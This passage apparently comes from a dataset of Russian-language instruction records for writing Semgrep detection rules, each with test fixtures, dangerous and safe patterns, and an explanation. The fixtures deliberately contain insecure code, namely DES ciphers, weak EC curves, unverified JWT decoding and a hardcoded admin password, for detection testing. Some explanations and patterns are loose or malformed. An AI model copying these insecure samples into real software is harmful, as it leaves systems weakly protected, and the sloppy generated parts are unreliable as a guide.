from \"jwt-decode\";\n...\nconst exp = decoded.exp * 1000;\n\nБезопасные паттерны:  \n• // File: react-jwt-decoded-property.tsx\nimport jwt_decode from \"jwt-decode\";\n...\nfoobar(decoded);\n• // File: react-jwt-decoded-property.jsx\nimport jwt_decode from \"jwt-decode\";\n...\nfoobar(decoded);\n\nЛегенда аннотаций:\n- // ruleid:react-jwt-decoded-property: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:react-jwt-decoded-property: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: react-jwt-decoded-property\n  message: >-\n    Property decoded from JWT token without verifying and cannot be trustworthy.\n  metadata:\n    cwe:\n    - 'CWE-922: Insecure Storage of Sensitive Information'\n    references:\n    - https://pragmaticwebsecurity.com/articles/oauthoidc/localstorage-xss.html\n    category: security\n    owasp:\n    - A01:2021 - Broken Access Control\n    technology:\n    - react\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - typescript\n  - javascript\n  severity: INFO\n  patterns:\n  - pattern-inside: |\n      import jwt_decode from \"jwt-decode\";\n      ...\n  - pattern-inside: |\n      $DECODED = jwt_decode($TOKEN,...);\n      ...\n  - pattern: $DECODED.$PROPERTY\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования свойства, декодированного из токена JWT, без предварительной проверки подлинности. Анализ выполняется путем поиска импорта функции jwt_decode и последующего применения ее к токену. Опасным является случай, когда декодированное свойство напрямую используется без дополнительной проверки или верификации. Безопасным считается случай, если после декодирования токена выполняются дополнительные действия перед использованием свойств.\n\n# Ключевые элементы:\n- ID: react-jwt-decoded-property\n- Язык: typescript \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "react-jwt-decoded-property",
      "language": "typescript",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения metadata-likelihood-incorrect-value\nОписание уязвимости: Semgrep rule likelihood: $VALUE detected, but the value must be LOW, MEDIUM, or HIGH. For more information visit: https://semgrep.dev/docs/contributing/contributing-to-semgrep-rules-repository/\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: metadata-likelihood-incorrect-value.test.yaml\nrules:\n  - id: id-request\n    message: >-\n      If an attacker controls the x in require(x) then they can cause code to load that was not intended to run on the server.\n    severity: LOW\n    languages: [javascript, typescript]\n    metadata:\n      owasp: \"A03:2021 - Injection\"\n      cwe: \"CWE-706: Use of Incorrectly-Resolved Name or Reference\"\n      source-rule-url: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html\n      category: security\n      # ruleid: metadata-likelihood-incorrect-value\n      likelihood: lOW\n      impact: LOW\n      technology:\n        - express\n      references:\n        - https://github.com/google/node-sec-roadmap/blob/master/chapter-2/dynamism.md#dynamism-when-you-need-it\n    patterns: \n  - id: ok-request\n    message: >-\n      If an attacker controls the x in require(x) then they can cause code to load that was not intended to run on the server.\n    severity: LOW\n    languages: [javascript, typescript]\n    metadata:\n      owasp: \"A03:2021 - Injection\"\n      cwe: \"CWE-706: Use of Incorrectly-Resolved Name or Reference\"\n      source-rule-url: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html\n      category: security\n      # ok: metadata-likelihood-incorrect-value\n      likelihood: LOW\n      technology:\n        - express\n      references:\n        - https://github.com/google/node-sec-roadmap/blob/master/chapter-2/dynamism.md#dynamism-when-you-need-it\n    patterns:  # Ограничиваем длину\n\nОпасные паттерны:\n• rules:\n- id: example\n  metadata:\n    likelihood: CRITICAL\n\n• rules:\n- id: another_example\n  metadata:\n    likelihood: UNKNOWN\n\n• rules:\n- id: yet_another_example\n  metadata:\n    likelihood: 10\n\n\nБезопасные паттерны:  \n• rules:\n- id: correct_likelihood\n  metadata:\n    likelihood: LOW\n\n• rules:\n- id: medium_likelihood\n  metadata:\n    likelihood: MEDIUM\n\n• rules:\n- id: high_likelihood\n  metadata:\n    likelihood: HIGH\n\n\nЛегенда аннотаций:\n- // ruleid:metadata-likelihood-incorrect-value: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:metadata-likelihood-incorrect-value: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: metadata-likelihood-incorrect-value\n  message: >-\n    Semgrep rule likelihood: $VALUE detected, but the value must be LOW, MEDIUM, or HIGH. For more information\n    visit: https://semgrep.dev/docs/contributing/contributing-to-semgrep-rules-repository/\n  severity: WARNING\n  metadata:\n    category: correctness\n    references:\n    - https://semgrep.dev/docs/contributing/contributing-to-semgrep-rules-repository/\n    technology:\n    - semgrep\n  languages:\n  - yaml\n  patterns:\n  - pattern-inside: |\n      rules: \n        ...\n  - pattern-inside: |\n      metadata: \n        ...\n        category: security\n        ...\n  - pattern: |\n      likelihood: $VALUE\n  - pattern-not: |\n      likelihood: LOW\n  - pattern-not: |\n      likelihood: MEDIUM\n  - pattern-not: |\n      likelihood: HIGH\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска некорректных значений атрибута 'likelihood' в метаданных YAML-файла. Правило проверяет наличие ключевого слова 'likelihood' внутри блока 'metadata', затем ищет значение этого ключа и применяет условие отрицания для проверки допустимых значений ('LOW', 'MEDIUM' или 'HIGH'). Если обнаруживается другое значение, генерируется предупреждение.\n\n# Ключевые элементы:\n- ID: metadata-likelihood-incorrect-value\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "metadata-likelihood-incorrect-value",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: aws-s3-object-copy-encrypted-with-cmk\nОписание уязвимости: Ensure S3 object copies are encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-s3-object-copy-encrypted-with-cmk.tf\nresource \"aws_s3_object_copy\" \"pass\" {\n  bucket             = aws_s3_bucket.target.bucket\n  bucket_key_enabled = true\n  key                = \"test\"\n  kms_key_id         = aws_kms_key.test.arn\n  source             = \"${aws_s3_bucket.source.bucket}/${aws_s3_bucket_object.source.key}\"\n}\n# ruleid: aws-s3-object-copy-encrypted-with-cmk\nresource \"aws_s3_object_copy\" \"fail\" {\n  bucket             = aws_s3_bucket.target.bucket\n  bucket_key_enabled = true\n  key                = \"test\"\n  source             = \"${aws_s3_bucket.source.bucket}/${aws_s3_bucket_object.source.key}\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_s3_object_copy\" \"fail\" { ... }\n• resource \"aws_s3_object_copy\" \"another_fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_s3_object_copy\" \"pass\" { kms_key_id = ... }\n• resource \"aws_s3_object_copy\" \"safe\" { kms_key_id = ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-s3-object-copy-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-s3-object-copy-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-s3-object-copy-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"aws_s3_object_copy\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_s3_object_copy\" $ANYTHING {\n        ...\n        kms_key_id = ...\n        ...\n      }\n  message: >-\n    Ensure S3 object copies are encrypted at rest using KMS CMKs. CMKs gives you control over the encryption\n    key in terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS S3 Object Copy в Terraform конфигурациях HCL, где отсутствует атрибут kms_key_id, необходимый для шифрования объекта при копировании с использованием ключа управления ключами (CMK). Правило использует шаблон ресурса aws_s3_object_copy и проверяет наличие атрибута kms_key_id внутри этого шаблона. Если атрибут отсутствует, правило отмечает код как небезопасный.\n\n# Ключевые элементы:\n- ID: aws-s3-object-copy-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-s3-object-copy-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: missing-dnf-clean-all\nОписание уязвимости: This dnf command does not end with '&& dnf clean all'. Running 'dnf clean all' will remove cached data and reduce package size. (This must be performed in the same RUN step.)\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-dnf-clean-all.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL3038\n\nFROM centos\n\n# ok: missing-dnf-clean-all\nRUN dnf update \\\n    && dnf install foo-1.0 \\\n    && dnf clean all\n\n# ok: missing-dnf-clean-all\nRUN dnf update && \\\n    dnf install foo-1.0 && \\\n    dnf clean all\n\n# ruleid: missing-dnf-clean-all\nRUN dnf install foo-1.0  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN dnf install foo-1.0\n• RUN dnf update && dnf install bar-1.0\n\nБезопасные паттерны:  \n• RUN dnf update && dnf install foo-1.0 && dnf clean all\n• RUN dnf update && \\ dnf install bar-1.0 && dnf clean all\n\nЛегенда аннотаций:\n- // ruleid:missing-dnf-clean-all: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-dnf-clean-all: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: missing-dnf-clean-all\n    severity: WARNING\n    languages: [dockerfile]\n    patterns:\n      - pattern: RUN ... dnf ...\n      - pattern-not-inside: RUN ... && dnf clean all\n      - pattern-not-inside: RUN ... && \\ dnf clean all\n    message: >-\n      This dnf command does not end with '&& dnf clean all'. Running 'dnf clean all' will remove cached data and reduce package size. (This must be performed in the same RUN step.)\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3038\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3038\n      category: best-practice\n      technology:\n        - dockerfile\n\n\n# Логика правила:\nЭто правило ищет инструкции RUN в Dockerfile, содержащие команду dnf. Оно проверяет, что после команды dnf не следует команда '&& dnf clean all'. Если такая комбинация отсутствует, правило отмечает это как потенциальную проблему безопасности, так как очистка кеша dnf может улучшить производительность и уменьшить размер образов.\n\n# Ключевые элементы:\n- ID: missing-dnf-clean-all\n- Язык: dockerfile \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-dnf-clean-all",
      "language": "dockerfile",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: package-dependencies-check\nОписание уязвимости: Package dependencies with variant versions may lead to dependency hijack and confusion attacks. Better to specify an exact version or use package-lock.json for a specific version of the package.\nCWE: CWE-427: Uncontrolled Search Path Element\nТип анализа: search\nЯзык: json",
    "input": "Требования:\n- Язык: json\n- Тип анализа: search\n- CWE: CWE-427: Uncontrolled Search Path Element\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: package-dependencies-check.package.json\n\n{\n  \"name\": \"some-internal-library\",\n  \"version\": \"1.0.0\",\n  \"license\": \"Apache-2.0\",\n  \"dependencies\": {\n\n    // ruleid: package-dependencies-check\n    \"package1\": \"latest\",\n    // ruleid: package-dependencies-check\n    \"package2\": \"1.0.0 - 2.9999.9999\",\n    // ruleid: package-dependencies-check\n    \"package3\": \">=1.0.2 <2.1.2\",\n    // ruleid: package-dependencies-check\n    \"package4\": \">1.0.2 <=2.3.4\",\n    // ruleid: package-dependencies-check\n    \"package5\": \"<1.0.0 || >=2.3.1 <2.4.5 || >=2.5.2 <3.0.0\",\n    // ruleid: package-dependencies-check\n    \"package6\": \"~1.2\",\n    // ruleid: package-dependencies-check\n    \"package7\": \"~1.2.3\",\n    // ruleid: package-dependencies-check\n    \"package8\": \"2.x\",\n    // ruleid: package-dependencies-check\n    \"package9\": \"3.3.x\",\n    // ruleid: package-dependencies-check\n    \"package10\": \"^3.5.2\",\n    // ok: package-dependencies-check\n    \"package11\": \"http://asdf.com/asdf.tar.gz\",\n    // ok: package-dependencies-check\n    \"package12\": \"file:../dyl\",\n    // ok: package-dependencies-check\n    \"package13\": \"2.0.1\",\n    // ok: package-dependencies-check\n    \"package14\": \"1.1.0\",\n    //ok: package-dependencies-check\n    \"package15\": \"2.1.0-alpha.2\",\n    // ok: package-dependencies-check\n    \"@npm/package1\": \"1.1.0\",\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• { \"dependencies\": { \"package\": \"latest\" }}\n• { \"dependencies\": { \"package\": \"1.0.0 - 2.9999.9999\" }}\n• { \"dependencies\": { \"package\": \">=1.0.2 <2.1.2\" }}\n\nБезопасные паттерны:  \n• { \"dependencies\": { \"package\": \"1.1.0\" }}\n• { \"dependencies\": { \"package\": \"@npm/package1\": \"1.1.0\" }}\n• { \"dependencies\": { \"package\": \"2.0.1\" }}\n\nЛегенда аннотаций:\n- // ruleid:package-dependencies-check: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:package-dependencies-check: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: package-dependencies-check\n  patterns:\n  - pattern-not-regex: \\\"[\\w\\-.]*\\\"\\s*:\\s*\\\"[\\d.]+-[\\w.]+\\\"\n  - pattern-either:\n    - pattern-regex: \\\"[\\w\\-.]*\\\"\\s*:\\s*\\\"latest\\\"\n    - pattern-regex: \\\"[\\w\\-.]*\\\"\\s*:\\s*\\\"[^~\\-\\^><=\\\"x]*[~\\-\\^><=x]+.*\\\"\n  - pattern-either:\n    - pattern-inside: |\n        \"dependencies\": {\n          ...\n        }\n    - pattern-inside: |\n        \"devDependencies\": {\n          ...\n        }\n    - pattern-inside: |\n        \"optionalDependencies\": {\n          ...\n        }\n    - pattern-inside: |\n        \"peerDependencies\": {\n          ...\n        }\n  - pattern-not-inside: |\n      \"_shrinkwrap\": {\n        ...\n      }\n  paths:\n    include:\n    - '*package.json'\n  message: Package dependencies with variant versions may lead to dependency hijack and confusion attacks.\n    Better to specify an exact version or use package-lock.json for a specific version of the package.\n  languages:\n  - json\n  metadata:\n    category: security\n    vulnerability: Security Misconfiguration\n    owasp: 'A05:2021 - Security Misconfiguration'\n    cwe:\n    - 'CWE-427: Uncontrolled Search Path Element'\n    references:\n    - https://security.snyk.io/vuln/SNYK-JS-COLORS-2331906\n    - https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610\n    - https://cwe.mitre.org/data/definitions/427.html\n    technology:\n    - npm\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска зависимостей пакетов с неопределенными или изменчивыми версиями в файле package.json. Паттерны ищут строки, содержащие версии пакетов, выраженные через диапазоны, символы ~ и ^, а также ключевые слова latest и x. Исключаются случаи, когда зависимости указаны внутри разделов _shrinkwrap, которые обычно используются для фиксации версий. Правило применимо только к файлам package.json и использует регулярные выражения для точного сопоставления строк.\n\n# Ключевые элементы:\n- ID: package-dependencies-check\n- Язык: json \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "package-dependencies-check",
      "language": "json",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: azure-synapse-workscape-enables-managed-virtual-network\nОписание уязвимости: Ensure that Azure Synapse workspaces enables managed virtual networks\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-synapse-workscape-enables-managed-virtual-network.tf\n# fail\n# ruleid: azure-synapse-workscape-enables-managed-virtual-network\nresource \"azurerm_synapse_workspace\" \"example\" {\n    name                                 = \"example\"\n    resource_group_name                  = azurerm_resource_group.example.name\n    location                             = azurerm_resource_group.example.location\n    storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n    sql_administrator_login              = \"sqladminuser\"\n    sql_administrator_login_password     = \"H@Sh1CoR3!\"\n    managed_virtual_network_enabled      = false\n    aad_admin {\n    login     = \"AzureAD Admin\"\n    object_id = \"00000000-0000-0000-0000-000000000000\"\n    tenant_id = \"00000000-0000-0000-0000-000000000000\"\n    }\n\n    tags = {\n    Env = \"production\"\n    }\n}\n\n# fail\n# ruleid: azure-synapse-workscape-enables-managed-virtual-network\nresource \"azurerm_synapse_workspace\" \"example\" {\n    name                                 = \"example\"\n    resource_group_name                  = azurerm_resource_group.example.name\n    location                             = azurerm_resource_group.example.location\n    storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n    sql_administrator_login              = \"sqladminuser\"\n    sql_administrator_login_password     = \"H@Sh1CoR3!\"\n    aad_admin {\n    login     = \"AzureAD Admin\"\n    object_id = \"00000000-0000-0000-0000-000000000000\"\n    tenant_id = \"00000000-0000-0000-0000-000000000000\"\n    }\n\n    tags = {\n    Env = \"production\"\n    }\n}\n\n# pass\nresource \"azurerm_synapse_workspace\" \"example\" {\n    name                                 = \"example\"\n    resource_group_name                  = azurerm_resource_group.example.name\n    location                             = azurerm_resource_group.example.location\n    storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n    # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_synapse_workspace\" \"example\" { ... managed_virtual_network_enabled = false ... }\n• resource \"azurerm_synapse_workspace\" \"example\" { ... managed_virtual_network_enabled = false ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_synapse_workspace\" \"example\" { ... managed_virtual_network_enabled = true ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-synapse-workscape-enables-managed-virtual-network: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-synapse-workscape-enables-managed-virtual-network: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-synapse-workscape-enables-managed-virtual-network\n    message: >-\n      Ensure that Azure Synapse workspaces enables managed virtual networks\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_synapse_workspace\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_synapse_workspace\" \"...\" {\n          ...\n          managed_virtual_network_enabled = true\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов типа 'azurerm_synapse_workspace' в конфигурационном файле Terraform (HCL). Правило проверяет наличие блока ресурса и отсутствие явного указания параметра 'managed_virtual_network_enabled = true'. Если параметр не указан или имеет значение 'false', правило считает это опасным примером, так как работа Azure Synapse Workspace должна включать управляемую виртуальную сеть.\n\n# Ключевые элементы:\n- ID: azure-synapse-workscape-enables-managed-virtual-network\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-synapse-workscape-enables-managed-virtual-network",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: des-is-deprecated\nОписание уязвимости: DES is considered deprecated. AES is the recommended cipher. Upgrade to use AES. See https://www.nist.gov/news-events/news/2005/06/nist-withdraws-outdated-data-encryption-standard for more information.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: des-is-deprecated.fixed.java\npackage servlets;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class Cls extends HttpServlet\n{\n    private static org.apache.log4j.Logger log = Logger.getLogger(Register.class);\n\n    // cf. https://find-sec-bugs.github.io/bugs.htm#TDES_USAGE\n    protected void danger(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        // ruleid: des-is-deprecated\n        Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n        c.init(Cipher.ENCRYPT_MODE, k, iv);\n        byte[] cipherText = c.doFinal(plainText);\n    }\n\n    protected void danger2(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        // ruleid: des-is-deprecated\n        Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n        c.init(Cipher.ENCRYPT_MODE, k, iv);\n        byte[] cipherText = c.doFinal(plainText);\n    }\n\n    protected void ok(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        // ok: des-is-deprecated\n        Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n        c.init(Cipher.ENCRYPT_MODE, k, iv);\n        byte[] cipherText = c.doFinal(plainText);\n    }\n}\n\n\n// File: des-is-deprecated.java\npackage servlets;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class Cls extends HttpServlet\n{\n    private static org.apache.log4j.Logger log = Logger.getLogger(Register.class);\n\n    // cf. https://find-sec-bugs.github.io/bugs.htm#TDES_USAGE\n    pro  # Ограничиваем длину\n\nОпасные паттерны:\n• Cipher c = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n• Cipher c = Cipher.getInstance(\"DES\");\n\nБезопасные паттерны:  \n• Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n• Cipher c = Cipher.getInstance(\"AES\");\n\nЛегенда аннотаций:\n- // ruleid:des-is-deprecated: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:des-is-deprecated: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: des-is-deprecated\n  message: >-\n    DES is considered deprecated. AES is the recommended cipher.\n    Upgrade to use AES.\n    See https://www.nist.gov/news-events/news/2005/06/nist-withdraws-outdated-data-encryption-standard\n    for more information.\n  metadata:\n    functional-categories:\n      - 'crypto::search::symmetric-algorithm::javax.crypto'\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#DES_USAGE\n    asvs:\n      section: V6 Stored Cryptography Verification Requirements\n      control_id: 6.2.5 Insecure Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v62-algorithms\n      version: '4'\n    references:\n    - https://www.nist.gov/news-events/news/2005/06/nist-withdraws-outdated-data-encryption-standard\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#algorithms\n    category: security\n    technology:\n    - java\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: HIGH\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - pattern-inside: $CIPHER.getInstance(\"=~/DES/.*/\")\n    - pattern-inside: $CIPHER.getInstance(\"DES\")\n  - pattern-either:\n    - pattern: |\n        \"=~/DES/.*/\"\n    - pattern: |\n        \"DES\"\n  fix: |\n    \"AES/GCM/NoPadding\"\n  languages:\n  - java\n  - kt\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревшего алгоритма шифрования DES (Data Encryption Standard). Оно использует шаблон pattern-either для проверки двух условий внутри метода getInstance класса Cipher. Первое условие проверяет наличие строки, содержащей 'DES' в любом месте после символа '/', второе условие ищет прямую строку 'DES'. Если одно из этих условий выполняется, правило отмечает код как потенциально небезопасный.\n\n# Ключевые элементы:\n- ID: des-is-deprecated\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "des-is-deprecated",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: insufficient-ec-key-size\nОписание уязвимости: Detected an insufficient curve size for EC. NIST recommends a key size of 224 or higher. For example, use 'ec.SECP256R1'.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insufficient-ec-key-size.py\nimport os\nfrom cryptography.hazmat import backends\nfrom cryptography.hazmat.primitives.asymmetric import ec\n\n# ok: insufficient-ec-key-size\nec.generate_private_key(curve=ec.SECP256K1,\n                         backend=backends.default_backend())\n\n# ok: insufficient-ec-key-size\nec.generate_private_key(ec.SECP256K1,\n                         backends.default_backend())\n\n# ok: insufficient-ec-key-size\nec.generate_private_key(curve=os.getenv(\"EC_CURVE\"),\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-ec-key-size\nec.generate_private_key(curve=ec.SECP192R1,\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-ec-key-size\nec.generate_private_key(ec.SECT163K1,\n                         backends.default_backend())\n\n\n// File: insufficient-ec-key-size.fixed.py\nimport os\nfrom cryptography.hazmat import backends\nfrom cryptography.hazmat.primitives.asymmetric import ec\n\n# ok: insufficient-ec-key-size\nec.generate_private_key(curve=ec.SECP256K1,\n                         backend=backends.default_backend())\n\n# ok: insufficient-ec-key-size\nec.generate_private_key(ec.SECP256K1,\n                         backends.default_backend())\n\n# ok: insufficient-ec-key-size\nec.generate_private_key(curve=os.getenv(\"EC_CURVE\"),\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-ec-key-size\nec.generate_private_key(curve=ec.SECP256R1,\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-ec-key-size\nec.generate_private_key(ec.SECP256R1,\n                         backends.default_backend())  # Ограничиваем длину\n\nОпасные паттерны:\n• ec.generate_private_key(curve=ec.SECP192R1, backend=backends.default_backend())\n• ec.generate_private_key(ec.SECT163K1, backends.default_backend())\n\nБезопасные паттерны:  \n• ec.generate_private_key(curve=ec.SECP256K1, backend=backends.default_backend())\n• ec.generate_private_key(ec.SECP256K1, backends.default_backend())\n\nЛегенда аннотаций:\n- // ruleid:insufficient-ec-key-size: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insufficient-ec-key-size: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insufficient-ec-key-size\n  patterns:\n    - pattern-inside: cryptography.hazmat.primitives.asymmetric.ec.generate_private_key(...)\n    - pattern: cryptography.hazmat.primitives.asymmetric.ec.$SIZE\n    - metavariable-pattern:\n        metavariable: $SIZE\n        pattern-either:\n           - pattern: SECP192R1\n           - pattern: SECT163K1\n           - pattern: SECT163R2\n    - focus-metavariable: $SIZE\n  fix: |\n    SECP256R1\n  message: >-\n    Detected an insufficient curve size for EC. NIST recommends\n    a key size of 224 or higher. For example, use 'ec.SECP256R1'.\n  metadata:\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/bandit/plugins/weak_cryptographic_key.py\n    references:\n    - https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57Pt3r1.pdf\n    - https://cryptography.io/en/latest/hazmat/primitives/asymmetric/ec/#elliptic-curves\n    category: security\n    technology:\n    - cryptography\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    functional-categories:\n    - crypto::search::key-length::cryptography\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции generate_private_key из библиотеки cryptography.hazmat.primitives.asymmetric.ec, где используется кривая с недостаточным размером ключа. Паттерн ищет конкретные значения кривых, такие как SECP192R1 и SECT163K1, которые не соответствуют рекомендациям NIST по минимальной длине ключа 224 бита. Правило использует pattern-inside для ограничения области применения до вызова конкретной функции и pattern-either для определения опасных значений кривой.\n\n# Ключевые элементы:\n- ID: insufficient-ec-key-size\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insufficient-ec-key-size",
      "language": "python",
